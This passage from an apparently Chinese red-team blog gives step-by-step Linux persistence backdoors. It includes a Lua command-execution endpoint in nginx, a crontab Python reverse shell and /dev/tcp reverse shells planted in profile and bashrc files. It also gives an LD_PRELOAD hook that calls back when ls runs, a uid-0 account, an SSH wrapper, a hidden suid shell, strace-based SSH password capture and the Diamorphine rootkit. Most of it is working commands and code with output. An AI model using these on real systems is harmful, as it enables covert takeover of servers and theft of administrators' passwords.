<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">[root@debian client]# ./shadownginx shell <span class="number">172.16</span><span class="number">.42</span><span class="number">.151</span> <span class="number">80</span> shadowtest123</span><br><span class="line">[ shadownginx ] - <span class="symbol">Pwn</span> nginx</span><br><span class="line"><span class="symbol">Copyleft</span> by shadowtest123 @ openwill.me</span><br><span class="line">&lt;shadowtest123@gmail.com&gt;  [www.<span class="symbol">HackShell</span>.net]</span><br><span class="line"></span><br><span class="line"><span class="symbol">Usage</span>:</span><br><span class="line"><span class="symbol">Get</span> a shell access via the nginx running @ [ip]:[port]</span><br><span class="line">	./shadownginx shell [ip] [port] [password]</span><br><span class="line"><span class="symbol">Get</span> a socks5 tunnel listening at [socks5ip]:[socks5port]</span><br><span class="line">	./shadownginx socks5 [ip] [port] [password] [socks5ip] [socks5port]</span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Obtaining</span> shell access</span><br><span class="line">[i] <span class="symbol">About</span> to connect to nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Enjoy</span> the real world.</span><br><span class="line">nx1sh: turning off <span class="symbol">NDELAY</span> mode</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">65534</span>(nobody) gid=<span class="number">65534</span>(nogroup) groups=<span class="number">65534</span>(nogroup)</span><br></pre></td></tr></table></figure>

<p>修改的相关代码已经上传至github: <code>https://github.com/ShadowFl0w/shadownginx</code></p>
<h3 id="3-2-nginx-lua"><a href="#3-2-nginx-lua" class="headerlink" title="3.2 nginx + lua"></a>3.2 nginx + lua</h3><p>要求安装有ngx_lua模块，在openresty和tengine中是默认安装了ngx_lua模块的。</p>
<p>参考：<a href="https://github.com/netxfly/nginx_lua_security">https://github.com/netxfly/nginx_lua_security</a></p>
<p>安装openresty参加官网</p>
<p><strong>部署后门</strong></p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> ~]<span class="meta"># cd /usr/local/openresty/nginx/conf</span></span><br><span class="line">[root<span class="symbol">@vuln</span> conf]<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>在nginx.conf文件的server块中加入如下内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">location = /shadowtest &#123;  </span><br><span class="line">    default_type <span class="string">&#x27;text/plain&#x27;</span>;  </span><br><span class="line">    content_by_lua_file <span class="regexp">/usr/</span>local<span class="regexp">/openresty/</span>nginx<span class="regexp">/conflua/</span>shadowcmd.lua;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>lua脚本</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln conf]# vim <span class="regexp">/usr/</span>local<span class="regexp">/openresty/</span>nginx<span class="regexp">/conf/</span>shadowcmd.lua</span><br></pre></td></tr></table></figure>

<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">ngx.req.read_body()</span><br><span class="line"><span class="keyword">local</span> post_args = ngx.req.get_post_args()</span><br><span class="line"><span class="keyword">local</span> cmd = post_args[<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> cmd <span class="keyword">then</span></span><br><span class="line">    f_ret = <span class="built_in">io</span>.<span class="built_in">popen</span>(cmd)</span><br><span class="line">    <span class="keyword">local</span> ret = f_ret:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line">    ngx.say(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s&quot;</span>, ret))</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>启动openresty</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln conf]# <span class="regexp">/usr/</span>local<span class="regexp">/openresty/</span>nginx<span class="regexp">/sbin/</span>nginx  -c <span class="regexp">/usr/</span>local<span class="regexp">/openresty/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>

<p>攻击</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl <span class="string">&#x27;http://172.16.42.151/shadowtest&#x27;</span> -d <span class="string">&#x27;cmd=id&#x27;</span></span><br><span class="line"><span class="attribute">uid</span>=65534(nobody) <span class="attribute">gid</span>=65534(nogroup) <span class="attribute">groups</span>=65534(nogroup)</span><br></pre></td></tr></table></figure>



<h2 id="4-计划任务后门"><a href="#4-计划任务后门" class="headerlink" title="4. 计划任务后门"></a>4. 计划任务后门</h2><p><strong>crontab反弹python shell</strong></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">(crontab -l;printf <span class="string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="subst">\&quot;</span>172.16.42.150<span class="subst">\&quot;</span>,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="subst">\&quot;</span>/bin/sh<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>-i<span class="subst">\&quot;</span>]);&#x27;<span class="subst">\n</span>&quot;</span>)|crontab -</span><br></pre></td></tr></table></figure>



<p><strong>由于系统的不同，crontrab定时文件位置也会不同：</strong></p>
<ul>
<li>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></li>
<li>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></li>
</ul>
<h2 id="5-环境变量后门"><a href="#5-环境变量后门" class="headerlink" title="5. 环境变量后门"></a>5. 环境变量后门</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.150/8881 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>profile</span><br></pre></td></tr></table></figure>

<p>切换到bash，执行source命令，或者新的终端调用到/etc/profle触发</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@vuln</span> ~]<span class="comment"># /bin/bash</span></span><br><span class="line">root<span class="variable">@vuln</span><span class="symbol">:~</span><span class="comment"># source /etc/profile</span></span><br></pre></td></tr></table></figure>

<p>同理</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>bashrc</span><br><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.bash_profile</span><br><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.bash_login</span><br><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.profile</span><br><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.inputrc</span><br></pre></td></tr></table></figure>





<h2 id="6-ld-preload后⻔"><a href="#6-ld-preload后⻔" class="headerlink" title="6. ld_preload后⻔"></a>6. ld_preload后⻔</h2><p>详细参考：<a href="https://shadowfl0w.github.io/LD-PRELOAD%E5%AD%A6%E4%B9%A0/">https://shadowfl0w.github.io/LD-PRELOAD%E5%AD%A6%E4%B9%A0/</a></p>
<p>当我们得知了一个系统命令所调用的库函数 后，我们可以重写指定的库函数进行劫持。这里我们以 <code>ls</code> 命令为例进行演示。</p>
<p>首先查看 <code>ls</code> 这一系统命令会调用哪些库函数：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">readelf -Ws <span class="regexp">/usr/</span>bin/ls</span><br></pre></td></tr></table></figure>

<p>选择的是 strncmp 进行Hook</p>
<ul>
<li>hook_strncmp.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@vuln /tmp]# <span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=<span class="variable">$PWD</span>/hook_strncmp.so</span><br><span class="line">[root@vuln /tmp]# ls</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) 组=0(root)</span><br><span class="line">hook_strcmp.c  hook_strcmp.so  hook_strncmp.c  hook_strncmp.so  passcheck  passcheck.c</span><br><span class="line">[root@vuln /tmp]#</span><br></pre></td></tr></table></figure>

<p>利用这种思路，我们可以制作一个隐藏得 Linux 后门，比如当管理员执行 <code>ls</code> 命令时会反弹一个 Shell：</p>
<ul>
<li>hook_strncmp.c</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.42.150/4444 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure>

<p>然后在 <code>.bashrc</code> 中写入，我这里用的是zsh，所以写入了.zshrc：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=/tmp/hook_strncmp.so</span><br></pre></td></tr></table></figure>

<p>执行ls成功收到了shell</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="string">[root@debian ~]</span># nc -lvvp <span class="number">4444</span></span><br><span class="line">listening on <span class="string">[any]</span> <span class="number">4444</span> ...</span><br><span class="line"><span class="number">172.16.42.151</span>: inverse host lookup failed: Unknown host</span><br><span class="line">connect to <span class="string">[172.16.42.150]</span> from (UNKNOWN) <span class="string">[172.16.42.151]</span> <span class="number">4124</span></span><br></pre></td></tr></table></figure>

<p>这种方式，会影响系统运行，我在执行vim后就会卡顿。</p>
<h2 id="7-ssh公钥免密"><a href="#7-ssh公钥免密" class="headerlink" title="7. ssh公钥免密"></a>7. ssh公钥免密</h2><p>将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。</p>
<p>生成公私钥</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>

<p>此时进到 ～/.ssh目录可以看到 id_rsa 和 id_rsa.pub 两个文件</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~<span class="string">/.ssh</span></span><br><span class="line"><span class="keyword">ls</span></span><br></pre></td></tr></table></figure>

<p>将上边 本地mac 的 <strong>id_rsa.pub</strong>里边的内容，复制到 服务器上的 <strong>.ssh/authorized_keys</strong> 文件中</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#客户端执行</span></span><br><span class="line">scp ~<span class="regexp">/.ssh/i</span>d_rsa.pub root@<span class="number">172.16</span>.<span class="number">42.150</span>:<span class="regexp">/root/i</span>d_rsa.pub</span><br><span class="line"><span class="comment">#服务端执行</span></span><br><span class="line">cat <span class="regexp">/root/i</span>d_rsa.pub &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>服务器修改权限</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">700</span> ~/.ssh </span><br><span class="line"><span class="attribute">chmod</span> <span class="number">600</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>免密登陆</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">ssh root<span class="symbol">@ip</span> <span class="meta"># 默认端口登陆</span></span><br><span class="line">ssh root<span class="symbol">@ip</span> -p 端口号 <span class="meta"># 指定端口登陆</span></span><br></pre></td></tr></table></figure>



<h2 id="8-创建uid为0的后门账户"><a href="#8-创建uid为0的后门账户" class="headerlink" title="8. 创建uid为0的后门账户"></a>8. 创建uid为0的后门账户</h2><p>交互式创建</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> ~]<span class="meta"># useradd -o -u 0 shadowtest</span></span><br><span class="line">[root<span class="symbol">@debian</span> ~]<span class="meta"># passwd shadowtest</span></span><br><span class="line">新的 密码：</span><br></pre></td></tr></table></figure>

<p>非交互式</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">useradd -o -u 0 shadowtest &amp;&amp; <span class="keyword">echo</span> <span class="string">&quot;shad0wtest&quot;</span> | passwd backdoor <span class="params">--stdin</span></span><br></pre></td></tr></table></figure>



<p>删除用户</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">userdel -r -f backdoor</span></span><br></pre></td></tr></table></figure>





<h2 id="9-SSH-wrapper后门"><a href="#9-SSH-wrapper后门" class="headerlink" title="9. SSH wrapper后门"></a>9. SSH wrapper后门</h2><p>服务端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vuln ~]# cd /usr/sbin/</span><br><span class="line">[root@vuln sbin]# mv sshd ../bin/</span><br><span class="line">[root@vuln sbin]# echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">[root@vuln sbin]# echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">[root@vuln sbin]# echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">[root@vuln sbin]# chmod u+x sshd</span><br><span class="line">[root@vuln sbin]# systemctl restart sshd</span><br><span class="line">[root@vuln sbin]#</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight python-repl"><table><tr><td class="code"><pre><span class="line">[root@debian ~]# socat STDIO TCP4:172.16.42.151:22,sourceport=13377</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">hostname</span><br><span class="line">vuln</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> struct</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span></span><br><span class="line">&#x27;\x00\x00LF&#x27;</span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="built_in">print</span> buffer</span></span><br><span class="line">4A</span><br></pre></td></tr></table></figure>

<p><strong>靶机重启，攻击机断开连接后失效</strong></p>
<h2 id="10-ssh-软连接"><a href="#10-ssh-软连接" class="headerlink" title="10. ssh 软连接"></a>10. ssh 软连接</h2><p>靶机</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln ~]# ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su; /</span>tmp/su -oPort=<span class="number">5555</span>;</span><br><span class="line">[root@vuln ~]#</span><br></pre></td></tr></table></figure>

<p>攻击机</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="string">[root@debian ~]</span># ssh <span class="symbol">root@</span><span class="number">172.16</span><span class="number">.42</span><span class="number">.151</span> -p <span class="number">5555</span></span><br><span class="line"><span class="symbol">root@</span><span class="number">172.16</span><span class="number">.42</span><span class="number">.151</span><span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>

<p><strong>需要输入密码</strong></p>
<h2 id="11-suid-shell"><a href="#11-suid-shell" class="headerlink" title="11. suid shell"></a>11. suid shell</h2><p>在某个用户目录下建立一个隐藏的suid文件.233，之后在每次使用时，以其他普通用户的身份使用-p选项运行此文件，即可获得一个root权限的shell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/home/</span>shadowtest/.<span class="number">233</span> -p</span><br></pre></td></tr></table></figure>



<p>靶机：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@vuln <span class="regexp">/home]# useradd -d /</span>home/shadowtest -m shadowtest</span><br><span class="line">[root@vuln /home]<span class="comment"># passwd shadowtest</span></span><br><span class="line">新的 密码：</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：已成功更新密码</span><br><span class="line">[root@vuln <span class="regexp">/home]# cp /</span>bin<span class="regexp">/bash /</span>home<span class="regexp">/shadowtest/</span>.<span class="number">233</span></span><br><span class="line">[root@vuln <span class="regexp">/home]# chmod 4755 /</span>home<span class="regexp">/shadowtest/</span>.<span class="number">233</span></span><br></pre></td></tr></table></figure>

<p>攻击机：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">[root<span class="meta">@debian</span> ~]<span class="comment"># ssh shadowtest@172.16.42.151</span></span><br><span class="line">shadowtest<span class="meta">@172.16.42.151&#x27;s</span> password:</span><br><span class="line">$ whoami</span><br><span class="line">shadowtest</span><br><span class="line">$ /home/shadowtest/.233 -p</span><br><span class="line">.233-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>



<h2 id="12-SSH-Keylogger（Strace）"><a href="#12-SSH-Keylogger（Strace）" class="headerlink" title="12 SSH Keylogger（Strace）"></a>12 SSH Keylogger（Strace）</h2><p>注意区别ptrace。</p>
<p>strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p>
<p><strong>第一种方式</strong></p>
<p>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</p>
<p>如果系统没有安装strace服务，先给他安装一个</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">apt <span class="keyword">install</span> strace</span><br></pre></td></tr></table></figure>

<p>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码</p>
<p>比如当前用户是root</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root/</span></span><br><span class="line">vim <span class="string">.bashrc</span></span><br></pre></td></tr></table></figure>

<p>在.bashrc文件的最后一行填上</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/.sshpwd-`date &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使bashrc配置生效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> .bashrc</span><br></pre></td></tr></table></figure>

<p>之后只要用这台机器登录其他机器或者执行su切换用户输入密码都可以被记录到/tmp/.sshpwd***文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@vuln:/tmp# ls -a</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.font-unix</span><br><span class="line">.ICE-unix</span><br><span class="line">.sshpwd-242月021645667067.log</span><br><span class="line">.sshpwd-242月021645667104.log</span><br><span class="line">systemd-private-36c85ff4ad564cf7826c4f24daa1425e-apache2.service-lPYJk8</span><br><span class="line">systemd-private-36c85ff4ad564cf7826c4f24daa1425e-systemd-timesyncd.service-8vJ5jO</span><br><span class="line">.Test-unix</span><br><span class="line">.X11-unix</span><br><span class="line">.XIM-unix</span><br></pre></td></tr></table></figure>

<p>查看一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vuln:/tmp<span class="comment"># cat .sshpwd-242月021645667067.log | grep read</span></span><br><span class="line">......</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\211Jc\262!Z\224l\267.\270]\207\201`\225\34\303\313\7\277\352C\223\4\377\22\32\227\3618!\324d\275\313-\342t\312q\225\241]&quot;</span>, 8192) = 44</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;`8\20b\212\24\206\326\377\323\214\254OtNe\33=\262,\204lc\225\330\325\360&gt;\216&amp;\306\230P\256\n4\351;\357Lo\274\205\10\262\252n9n\264\177E&quot;</span>, 8192) = 52</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;r&quot;</span>, 1)                         = 1</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;o&quot;</span>, 1)                         = 1</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;o&quot;</span>, 1)                         = 1</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;t&quot;</span>, 1)                         = 1</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;\n&quot;</span>, 1)                        = 1</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\242+\276\234i\340V\254\355\37qz\361eA\263(\223\367\272\307&#123;\223\373+\177\252;&quot;</span>, 8192) = 28</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>找到密码为root</p>
<p><strong>第二种方式</strong></p>
<p>不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">ps -ef | <span class="keyword">grep</span> sshd    <span class="comment">//父进程PID</span></span><br><span class="line">strace -f -p <span class="number">523</span> -o <span class="regexp">/tmp/</span>.ssh.log -e trace=<span class="keyword">read</span>,<span class="keyword">write</span>,connect -s <span class="number">2048</span></span><br></pre></td></tr></table></figure>

<p>执行了这两条命令后，当有其他机器ssh连接本机器时，无论密码正确还是错误，都会被记录到/tmp/.ssh.log这个日志文件中</p>
<h2 id="13-Diamorphine后门"><a href="#13-Diamorphine后门" class="headerlink" title="13. Diamorphine后门"></a>13. Diamorphine后门</h2><p>Diamorphine 是一个Linux内核模块， 支持内核版本 2.6.x/3.x/4.x。可通过 uname -r 查看内核版本。</p>
<p>下载</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/m0nad/</span>Diamorphine</span><br></pre></td></tr></table></figure>

<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> test]<span class="meta"># cd Diamorphine</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># make</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#加载模块</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># insmod diamorphine.ko</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#该模块默认是隐藏的，要想可见执行</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># lsmod | grep -i Diamorphine</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># kill -63 0</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># lsmod | grep -i Diamorphine</span></span><br><span class="line">diamorphine            <span class="number">16384</span>  <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>使用</p>
<ul>
<li>When loaded, the module starts invisible;</li>
<li>Hide/unhide any process by sending a signal 31;</li>
<li>Sending a signal 63(to any pid) makes the module become (in)visible;</li>
<li>Sending a signal 64(to any pid) makes the given user become root;</li>
<li>Files or directories starting with the MAGIC_PREFIX become invisible;</li>
</ul>
<p>提权到root(必须root加载的模块)</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@vuln</span> Diamorphine]<span class="comment"># su shadowtest</span></span><br><span class="line"><span class="variable">$ </span>whoami</span><br><span class="line">shadowtest</span><br><span class="line"><span class="variable">$ </span>su root</span><br><span class="line">密码：</span><br><span class="line"><span class="symbol">su:</span> 鉴定故障</span><br><span class="line"><span class="variable">$ </span>kill <span class="number">-64</span> 0</span><br><span class="line"><span class="variable">$ </span>whoami</span><br><span class="line">root</span><br><span class="line"><span class="variable">$ </span>su root</span><br><span class="line">[root<span class="variable">@vuln</span> Diamorphine]<span class="comment">#</span></span><br></pre></td></tr></table></figure>







<h2 id="14-参考"><a href="#14-参考" class="headerlink" title="14. 参考"></a>14. 参考</h2><ul>
<li><a href="https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/">https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/</a></li>
<li><a href="https://www.cnblogs.com/xiaoxiaosen/p/13359729.html">https://www.cnblogs.com/xiaoxiaosen/p/13359729.html</a></li>
</ul>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title>linux进程注入</title>
    <url>/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<blockquote>
<p>持而盈之，不如其已。揣而锐之，不可长保。</p>
</blockquote>
<p>通过linux进程注入我们可以进行隐藏我们的攻击，维持我们的权限，某些场景下也可以进行容器逃逸。</p>
<span id="more"></span>

<h2 id="1-使用动态链接库进行进程注入"><a href="#1-使用动态链接库进行进程注入" class="headerlink" title="1. 使用动态链接库进行进程注入"></a>1. 使用动态链接库进行进程注入</h2><h3 id="1-1-动态链接注入"><a href="#1-1-动态链接注入" class="headerlink" title="1.1 动态链接注入"></a>1.1 动态链接注入</h3><p>通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用<code>ptrace()</code>实现了与Windows平台下相同作用的API 函数<code>CreateRemoteThread()</code>。</p>
<p>linux的/proc/sys/kernel/yama/ptrace_scope限制了一个进程除了<code>fork()</code>派生外，无法通过<code>ptrace()</code>来操作另外一个进程。我们可以通过<code>echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</code>来修改，但是一般linux版本默认就是为0。</p>
